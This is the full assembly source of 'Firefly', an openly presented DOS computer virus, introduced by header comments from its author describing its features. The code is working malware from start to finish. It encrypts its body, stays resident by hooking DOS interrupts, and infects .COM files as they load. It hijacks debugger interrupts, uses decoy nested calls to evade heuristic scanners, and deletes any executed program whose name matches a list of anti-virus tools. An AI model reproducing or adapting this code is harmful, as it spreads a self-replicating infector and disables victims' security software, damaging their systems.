;FIREFLY virus, by Nikademus.                
;
;Firefly is an encrypted, memory resident virus which infects
;.COMfiles on load.  It incorporates code from Proto-T, 
;LokJaw and YB-X viruses and, when in memory, attacks a large selection
;of anti-virus programs as they are executed.  Anti-virus programs
;identified by Firefly's execute/load handler are deleted.
;Firefly incorporates simple code from previous issues of the newsletter
;designed to de-install generic VSAFE resident virus activity
;filters designed for Microsoft by Central Point Software.  It
;contains instructions - specifically a segment of pseudo-nested 
;loops - which spoof F-Protect's expert system generic virus
;identification feature.
;
;FIREFLY also includes a visual marker tied to the system timer
;tick interrupt (1Ch) which slowly cycles the NumLock, CapsLock
;and ScrollLock LEDs on the keyboard.  This produces a noticeable
;twinkling effect when the virus is active on a machine.
;
;Anti-anti-virus measures used by Firefly vary in effectiveness
;dependent upon how a user employs software.  For example, while
;Firefly is designed to delete the Victor Charlie anti-virus
;shell, VC.EXE, a user who employs the software packages utilities
;for generic virus detection singly, will not be interfered with
;by the virus. Your results may vary, but the virus does effectively
;delete anti-virus programs while in memory unless steps are taken
;beforehand to avoid this.
;
;Firefly incorporates minor code armoring techniques designed to thwart
;trivial debugging.

		
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h

len             equ offset last - start
vir_len         equ len / 16d                    ; 16 bytes per paragraph 
encryptlength   equ (last - begin)/4+1



start:
		mov bx, offset begin        ; The Encryption Head
		mov cx, encryptlength       ;
encryption_loop:                            ;
		db      81h                 ; XOR WORD PTR [BX], ????h
		db      37h                 ;
encryption_value_1:                         ;
		dw      0000h               ;
					    ;
		db      81h                 ; XOR WORD PTR [BX+2], ????h
		db      77h                 ;
		db      02h                 ; 2 different random words
encryption_value_2:                         ; give 32-bit encryption
		dw      0000h               ;
		add     bx, 4               ;
		loop    encryption_loop     ;
begin:                                           
		jmp virus             
		db     '[Firefly] By Nikademus $'
		db     'Greetings to Urnst Kouch and the CRYPT staff. $'
virus:     
		call    bp_fixup                 ; bp fixup to determine
bp_fixup:                                        ; locations of data
		pop     bp                       ; with respect to the new      
		sub     bp, offset bp_fixup      ; host                  

Is_I_runnin:    
		call    screw_fprot              ; screwing
		call    screw_fprot              ; heuristic scanning
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		push    ds
		push    es
		mov     ax,2C2Ch                 ;  
		int     21h                      ; call to see if runnin  
		cmp     ax, 0FFFh                ; am i resident?
		jne     cut_hole                 ;
fix_victim:     
		pop     es                       ; replace victims 3 bytes
		pop     ds                       ;
		mov     di,050h                  ; stops one of SCAN's    
		add     di,0B0h                  ; generic scan attempts
		lea     si, ds:[vict_head + bp]  ; (scan only worked on        
		mov     cx, 03h                  ; unencrypted copies 
		rep     movsb                    ; regardless)
Bye_Bye: 
		mov     bx, 100h                 ; jump to 100h
		jmp     bx                       ; (start of victim)
cut_hole:  
		mov     dx, 5945h                ; pull CPAV (MSAV)
		mov     ax, 64001d               ; out of memory
		int     16h                      ; (This also screws with
						 ;  TBCLEAN ???????)
		
		call    screw_fprot              ; more screwing of
		call    screw_fprot              ; heuristic scanning
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;
		call    screw_fprot              ;

		mov     bx,cs                    ; reduce memory size     
		dec     bx                       ;    
		mov     ds,bx                    ;   
		cmp     byte ptr ds:[0000],5a    ;    
		jne     fix_victim               ;         
		mov     bx,ds:[0003]             ;    
		sub     bx, 100h                 ; # of 16byte paragraphs      
		mov     ds:0003,bx               ; to grab (4k)
Zopy_me:  
		xchg    bx, ax                   ; copy self to the new
		mov     bx, es                   ; 'unused' part of memory    
		add     bx, ax                   ;    
		mov     es, bx                   ;
		mov     cx,len                   ;
		mov     ax,ds                    ;   
		inc     ax                       ;
		mov     ds,ax                    ;
		lea     si,ds:[offset start+bp]  ;          
		lea     di,es:0100               ;   
		rep     movsb                    ;   

Hookroutines:                  ; interrupt manipulation (Happy!, Happy!)
		xor     ax, ax                    ;     (Joy!, Joy!)
		mov     ds, ax
		push    ds                        ; push 0000h
		lds     ax, ds:[1Ch*4]
		mov     word ptr es:old_1Ch, ax   ; save 1C
		mov     word ptr es:old_1Ch+2, ds 
		pop     ds
		push    ds
		lds     ax, ds:[21h*4]            ; get int 21h
		mov     word ptr es:old_21h, ax   ; save 21
		mov     word ptr es:old_21h+2, ds 
		mov     bx, ds                    ; bx = ds
		pop     ds
		mov     word ptr ds:[1h*4], ax    ; put int 21h into 1 and 3
		mov     word ptr ds:[1h*4+2], bx  ; this should screw   
		mov     word ptr ds:[3h*4], ax    ; most debuggers
		mov     word ptr ds:[3h*4+2], bx  
		mov     word ptr ds:[21h*4], offset Firefly ; put self in 21 
		mov     ds:[21h*4+2], es                    ;
		mov     ds:[1Ch*4+2], es
		mov     word ptr ds:[1Ch*4], offset Lights  ; hook 1C
		jmp     fix_victim
Lights:                                     ; keyboard lights changer...
					    ; found in NIKTRKS1.ZIP
		push    ax                  ; save these
		push    bx                  ;
		push    cx                  ;
		push    dx                  ;
		push    si                  ;
		push    di                  ;
		push    ds                  ;
		push    es                  ;
		
		push    cs
		pop     ds
		push    cs
		pop     es
		cmp     [click], 63d         ; after 63 clicks
		je      one
		cmp     [click], 126d        ; after 126 clicks
		je      two
		cmp     [click], 189d        ; after 189 clicks
		je      three
		cmp     [click], 0ffh        ; have we counted to 255?
		je      clear
		inc     [click]              ; increase click count
		jmp     endme
clear:          mov     [click], 00h         ; clear click count
		mov     ax, 40h
		mov     ds, ax
		mov     bx, 17h              ; ds:bx = location o' flags
		and     byte ptr [bx],0      ; clear keyboard flag(s)
		jmp     endme
one:            inc     [click]
		mov     ax, 40h
		mov     ds, ax
		mov     bx, 17h
		mov     byte ptr [bx],20h    ; set numlock flag
		jmp     endme
two:            inc     [click]
		mov     ax, 40h
		mov     ds, ax
		mov     bx, 17h
		mov     byte ptr [bx],40h    ; set caps lock flag
		jmp     endme
three:          inc     [click]
		mov     ax, 40h
		mov     ds, ax
		mov     bx, 17h              
		mov     byte ptr [bx],10h    ; set scroll lock flag
endme:       
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		jmp     dword ptr cs:[old_1Ch]     ; Go to old int 1Ch
		db      'Psalm 69'
screw_fprot:
		jmp  $ + 2                 ;  Nested calls to confuse
		call screw2                ;  f-protect's heuristic
		call screw2                ;  analysis
		call screw2                ;
		call screw2                ;
		call screw2                ;
		ret                        ;
screw2:                                    ;
		jmp  $ + 2                 ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		ret                        ;
screw3:                                    ;
		jmp  $ + 2                 ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		ret                        ;
screw4:                                    ;
		jmp  $ + 2                 ;
		ret                        ;
		db      'Every day is Halloween'
Firefly:                                   
		pushf                              ; Am I checking if     
		cmp     ax,2c2ch                   ; I am resident?
		jne     My_21h                     ;
		mov     ax,0FFFh                   ; If so, return
		popf                               ; 0FFFh in AX    
		iret                               ;
		
My_21h:         
		push    ax                         ; save these
		push    bx                         ;
		push    cx                         ;
		push    dx                         ;
		push    si                         ;
		push    di                         ;
		push    ds                         ;
		push    es                         ;
check_for_proper_calls:     
		cmp     ah, 4Bh                    ; executed? 
		je      chk_com 
		cmp     ah, 3Dh                    ; open?
		je      chk_com
		cmp     ah, 43h                    ; attribs?
		je      chk_com
		cmp     ah, 6Ch                    ; extended open?
		je      extended              
	       
notforme:       
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
		jmp     dword ptr cs:[old_21h]     ; The End
		db      'Happiness in Slavery'
extended:
		mov     dx, si                     ; now a normal open
chk_com:        
		mov     word ptr cs:victim_name,dx
		mov     word ptr cs:victim_name+2,ds
		cld                          
		mov     di,dx                
		push    ds
		pop     es
		mov     al,'.'                     ; find the period
		repne   scasb                      ;
		call    avtest                
		cmp     ax, 00ffh                  ; WAS the program an AV?
		je      notforme
		cmp     word ptr es:[di],'OC'      ; is i a .(CO)M?
		jne     notforme                
Grab_24:                                           ; hook interrupt 24
		push    ds                         ; by direct writes to 
		push    dx                         ; interrupt vector
		xor     ax, ax                     ; table
		mov     ds, ax                     ;
		mov     dx, offset new_24h         ;
		mov     word ptr ds:[24h*4], dx    ;
		mov     word ptr ds:[24h*4+2], es  ; 
		pop     dx                         
		pop     ds                         
		
open_victim:      
		push    cs
		pop     es
		lds     dx, cs:victim_name       ; get and save attributes
		mov     ax, 4300h                ;
		int     3h                       ;
		jc      notforme                 ; error handler
		push    cx                       ;
		push    ds                       ;
		push    dx                       
		mov     ax, 4301h                ; clear attribs
		xor     cx, cx                   ;
		int     1h                       ;
		jc      notforme
		mov     ax,3D02h                 ; open victim
		lds     dx, cs:victim_name       ;
		int     3h                       ;
		jc      notforme                 ; error handler
		push    cs                       ;
		pop     ds                       ;
		xchg    ax, bx                   ; put handle in proper place
get_date:                                        ; get and save date 
						 ; and time
		mov     ax,5700h        
		int     3h
		push    cx                       ; save time
		push    dx                       ; save date
		
check_forme:    
		mov     ah,3fh                       ; read 1st 3 bytes
		mov     cx,03h                       ;
		mov     dx,offset vict_head          ;
		int     1h
		
		mov     ax, 4202h                    ; point to end
		xor     cx, cx                       ;
		xor     dx, dx                       ;
		int     3h                           ;
		
		mov     cx, word ptr [vict_head+1]   ; possible jump location
		add     cx, last-start+3             ;
		cmp     ax, cx                       ; already infected?
		jz      save_date                    ;
		push    ax
get_random:                
		mov     ah, 2Ch                      ; dx and (cx-dx)
		int     3h                           ; will be to two
		or      dx, dx                       ; encryption values
		jz      get_random                   ;
write_virus:    
		mov     word ptr [offset encryption_value_1], dx
		mov     word ptr [offset e_value_1], dx
		sub     cx, dx
		mov     word ptr [offset encryption_value_2], cx
		mov     word ptr [offset e_value_2], cx
		pop     ax
		mov     si, ax                       ; fix BX offset in head
		add     si, ((offset begin-offset start)+100h) 
		mov     word ptr [offset start+1], si  
		
		mov     si, offset start             ; copy virus to buffer
		mov     di, offset encryptbuffer     ;
		mov     cx, last-start               ;
		rep     movsb                        ;

		sub     ax, 03h                          ; construct jump
		mov     word ptr [offset new_jump+1], ax ;
		mov     dl, 0E9h                         ;
		mov     byte ptr [offset new_jump], dl   ;
Encryptvirus_in_buffer:                
		push    bx                                   ; encrypt copy
		mov bx, offset ((begin-start)+encryptbuffer) ; in encrypt-           
		mov cx, encryptlength                        ; buffer
e_loop:                                                      ;
		db      81h                                  ; XOR [bx]
		db      37h                                  ;  
e_value_1:                                                   ;
		dw      0000h                                ; scrambler #1
		db      81h                                  ; XOR [bx+2]
		db      77h                                  ;
		db      02h                                  ;
e_value_2:                                                   ;
		dw      0000h                                ; scrambler #2
		add     bx, 4                                ;
		loop    e_loop                               ; loop

		pop     bx
		mov     ah, 40h                      ; write virus   
		mov     cx, last-start               ;
		mov     dx, offset encryptbuffer     ;
		int     1h                           ;
		
		mov     ax, 4200h                    ; point to front
		xor     cx, cx                       ;
		xor     dx, dx                       ;
		int     1h                           ;
		
		mov     ah, 40h                      ; write jump
		mov     dx, offset new_jump          ;
		mov     cx, 03h                      ;
		int     3h                           ;
save_date:                                     
		pop     dx                        ; Date
		pop     cx                        ; Time
		mov     ax,5701h                  ;
		int     1h
					       ;
close_file:                                    ;
		mov     ah,03Eh                ; Close file and restore  
		int     3h                     ; attribs
		mov     ax, 4301h              ;
		pop     dx                     ;
		pop     ds                     ; This is the end...
		pop     cx                     ; My only friend, The End.
		int     3h                     ;       - Jim Morrison
		jmp     notforme               ;
new_24h:        
		mov     al,3                   ; Critical Error (Mis)handler
		iret                           ;
		db      'The land of Rape and Honey'

		; This area is the "intelligence" of Firefly
		; It looks for known AV names which it then deletes.
		; So it sort of shuts down the computers "immune system"
avtest:
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      AV                         ;*IM
		
		cmp     word ptr es:[di-3],'XR'    ;*rx
		je      AV                         ;
		
		cmp     word ptr es:[di-3],'PO'    ;*STOP
		jne     next1                      ;(VIRSTOP)
		cmp     word ptr es:[di-5],'TS'    ;
		je      AV                         ;

next1:          cmp     word ptr es:[di-3],'VA'    ;*AV  i.e. cpav
		je      AV_Detected                ;(TBAV) (MSAV)  
		
		cmp     word ptr es:[di-3],'TO'    ;*prot  f-prot
		jne     next2                      ;
		cmp     word ptr es:[di-5],'RP'    ;
		jne     next2                      ;  
AV:             jmp     AV_Detected                ; must be equal

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan  McAffee's 
		jne     next3                      ;(TBSCAN)
		cmp     word ptr es:[di-5],'CS'    ;
		je      AV_Detected                ;  
		
		cmp     word ptr es:[di-3],'NA'    ;*lean  CLEAN..
		jne     next3                      ; why not eh?
		cmp     word ptr es:[di-5],'EL'    ;(TBCLEAN)
		je      AV_Detected                ;  

next3:          cmp     word ptr es:[di-3],'CV'    ; Victor Charlie
		je      AV_Detected                ; default  *VC
		
		cmp     word ptr es:[di-3],'KC'    ; VCHECK
		jne     next4                      ; (Victor Charlie)
		cmp     word ptr es:[di-5],'EH'    ; (TBCHECK) *HECK
		je      AV_Detected                ;  
next4:                
		cmp     word ptr es:[di-3],'ME'    ; TBMEM
		jne     next5                      ; *BMEM
		cmp     word ptr es:[di-5],'MB'    ; 
		je      AV_Detected                ;  
next5:                
		cmp     word ptr es:[di-3],'XN'    ; TBSCANX
		jne     next6                      ; *CANX
		cmp     word ptr es:[di-5],'AC'    ; 
		je      AV_Detected                ;  
next6:                
		cmp     word ptr es:[di-3],'EL'    ; TBFILE
		jne     next7                      ; *FILE
		cmp     word ptr es:[di-5],'IF'    ; 
		je      AV_Detected                ;  
next7:                
		ret
AV_Detected:      
		mov     ds, word ptr cs:[victim_name + 2] ; The Victim
		mov     dx, word ptr cs:[victim_name]
		mov     ax, 4301h                    ; Clear it's attribs
		mov     cx, 00h                      ;
		int     1h
		mov     ah, 41h                      ; Delete It.
		int     3h                           ; 
		ret                                  ;
		db      'Its Dead Jim'                               

vict_head       db  090h, 0cdh, 020h                 ; 3 bytes of storage
old_21h         dw  00h,00h                          ; int 21 storage
old_1Ch         dw  00h,00h
click           db  00h
last:                                               

; The heap........   junk not needed in main program

victim_name     dd  ?
new_jump        db  090h, 090h, 090h       
encryptbuffer   db       (last-start)+1 dup (?)
code            ends
		end start



